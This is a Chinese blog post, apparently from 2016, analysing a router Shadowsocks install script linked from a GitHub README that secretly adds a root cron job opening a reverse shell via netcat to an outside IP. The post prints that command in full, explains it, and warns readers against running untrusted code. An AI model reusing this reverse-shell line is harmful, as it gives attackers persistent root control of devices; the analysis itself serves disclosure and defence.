<!DOCTYPE html>
<html lang="en-us">

    <head>

        <title>什么？这xi。。哦不，这代码有毒</title>

        <style>

    html body {
        font-family: Quicksand, sans-serif;
        background-color: white;
    }

    :root {
        --accent: #f11111;
        --border-width:  0 ;
    }

</style>


<link rel="stylesheet" href="/css/main.css">





<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Quicksand">


 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css"> 


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
 


    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>

     <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/haskell.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/kotlin.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/scala.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/swift.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/lua.min.js"></script> 

    <script>hljs.initHighlightingOnLoad();</script>







<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>


<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
 <meta name="generator" content="Hugo 0.25" />

        <meta charset="utf-8">

        <meta name="viewport" content="width=device-width, initial-scale=1">

    </head>

    <body>

        <nav class="navbar navbar-default navbar-fixed-top">

            <div class="container">

                <div class="navbar-header">

                    <a class="navbar-brand visible-xs" href="#">什么？这xi。。哦不，这代码有毒</a>

                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>

                </div>

                <div class="collapse navbar-collapse">

                    
                        <ul class="nav navbar-nav">
                            
                                <li><a href="/">Home</a></li>
                            
                                <li><a href="/post/">Posts</a></li>
                            
                        </ul>
                    

                    

                </div>

            </div>

        </nav>


<main>

    <div class="item">

    

        <h4><a href="/post/gee_ss/">什么？这xi。。哦不，这代码有毒</a></h4>

        <h5>August 1, 2016</h5>

        

    

</div>


    <br> <div class="text-justify">

<p><img src="/images/gee_ss/title.png" alt="" /></p>

<h1 id="起源">起源</h1>

<p>之前在京东上开心的买了个极路由1s，百元内的智能路由，算是比较好用的。
当前主要是用来做shadowsock透明翻墙。</p>

<p>但极路由经常升级，每次升级都需要重新安装shadowsock，这一点十分麻烦。</p>

<p>好在网上有不少大神，写了各种一键安装脚本。</p>

<p>自然而然就点开了google搜索，键入关键字 “极路由shadowsocks“， 再来个按时间排序：Past month，想着有没有大神已经搞定了最新升级的脚本。</p>

<p><img src="/images/gee_ss/screenshot.png" alt="" /></p>

<p>熟练地点开排名前三的连接， 一看第二个连接是github，嗯，开源代码，想来比较靠谱，果断点入，查看了下<a href="https://github.com/jm33-m0/hiwifi_scripts/">README</a>的简介，感觉比较靠谱。果断按照readme的方式安装了。</p>

<p><img src="/images/gee_ss/screenshot (1).png" alt="" /></p>

<p>在做到第三步的时候有点不是很理解为什要去jm33.me这个网站下载shell脚本执行，明明可以直接将脚本托管到github上的嘛。到这里我也只是疑惑，由于github不时会抽风，可能作者是想给国内用户提供更好的下载速度吧，想来楼主必是好人。</p>

<p>安装过程一切顺利。不多赘述。</p>

<p>然而shadowsock的插件页面并没有显示出来，而是报了一个错误。这。。看来还是得亲自动手看看问题到底在哪儿。</p>

<h1 id="可疑的nc">可疑的nc</h1>

<p><img src="/images/gee_ss/screenshot (2).png" alt="" /></p>

<p>先看看这个curl下载的shadow.sh到底做了啥？</p>

<p>额，此nc非彼nc， nc全名<a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>是一个功能非常强大的网络工具，从man说明中：</p>

<p><img src="/images/gee_ss/screenshot (3).png" alt="" /></p>

<p>and much， much more嗯， 霸气侧漏的描述。</p>

<p>在50行中，nc连接到了45.32.253.23端口1082。<a href="http://whatismyipaddress.com/ip/45.32.253.23">查了下ip</a>发现是日本的一个服务器。</p>

<p><img src="/images/gee_ss/screenshot (4).png" alt="" /></p>

<h1 id="庖丁解牛">庖丁解牛</h1>

<pre><code>echo '*/1 * * * *  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 45.32.253.23 1082 &gt;/tmp/f' &gt;&gt; /etc/crontabs/root
</code></pre>

<ul>
<li>由外而内地看，这行代码是echo了一个字符串，然后把它附加到了/etc/crontabs/root文件的末尾，而这个文件正是root用户的定时执行任务列表， <a href="https://en.wikipedia.org/wiki/Cron#Non-Standard_Characters">*/1 * * * *</a>表示每隔一分钟执行一次。</li>
<li>每次执行什么命令呢</li>
<li>简单来说就是通过mkfifo命令创建一条<a href="https://en.wikipedia.org/wiki/Named_pipe">命名管道</a>/tmp/f，然后用cat读取管道中的内容，并使用/bin/sh执行， 并将执行结果通过nc发送到45.32.253.23的1082端口，并将从nc接收到的命令通过命名管道f将和cat再送到/bin/sh执行。相当于创造了一条从远程执行shell命令的通道。而且属于反向链接，可以穿透nat。</li>
</ul>

<pre><code>2&gt;&amp;1
</code></pre>

<ul>
<li>表示将stderr重定向到stdout</li>
<li>&amp;表示等同于，即2的输出重定向并等同于1</li>
</ul>

<ol>
<li>管道命令只处理前一个命令正确输出，不处理错误输出</li>
<li>管道命令右边命令，必须能够接收标准输入流命令才行。
管道触发两个子进程执行&rdquo;|&ldquo;两边的程序；而重定向是在一个进程内执行</li>
</ol>

<p>我们将地址改为localhost测试一下这个命令，果然直接拿到了路由器的root权限的shell：</p>

<p><img src="/images/gee_ss/screenshot (5).png" alt="" /></p>

<p><em>后记</em></p>

<p>千万不要执行来路不明的代码，刷来路不明的rom。</p>

<p>参考：</p>

<ul>
<li><a href="http://www.cnblogs.com/chengmo/archive/2010/10/21/1856577.html">linux shell 管道命令(pipe)使用及与shell重定向区别</a></li>
<li><a href="http://blog.csdn.net/cjfeii/article/details/10084343">Linux shell的标准输入、输出和错误</a></li>
</ul>
</div>

    
    

    

</main>

        <footer>

            <p class="copyright text-muted">&copy; All rights reserved.</p>

        </footer>

    </body>

</html>

